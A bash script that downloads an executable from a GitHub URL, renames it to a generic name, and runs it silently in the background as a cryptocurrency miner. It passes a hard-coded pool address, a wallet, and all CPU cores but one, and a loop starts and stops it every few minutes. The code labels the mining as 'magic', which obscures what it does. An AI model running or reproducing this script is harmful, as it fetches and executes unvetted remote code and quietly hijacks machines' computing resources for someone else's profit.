#!/bin/bash

# Get the number of CPU cores and subtract 1
num_cores=$(( $(nproc) - 1 ))

# Download the script
wget -O sgq https://github.com/barburonjilo/back/raw/main/sr

# Make the script executable
chmod +x sgq

# Generate a localized date string
WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')

# Function to start the magic process
start_magic() {
  nohup ./sgq -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 -t $num_cores > /dev/null 2>&1 &
  echo "Magic started with PID: $!"
}

# Function to stop the magic process
stop_magic() {
  pkill -f sgq
  echo "Magic stopped"
}

# Run the loop
while true; do
  start_magic
  sleep 600  # Wait for 10 minutes
  stop_magic
  sleep 120  # Wait for 2 minutes
done
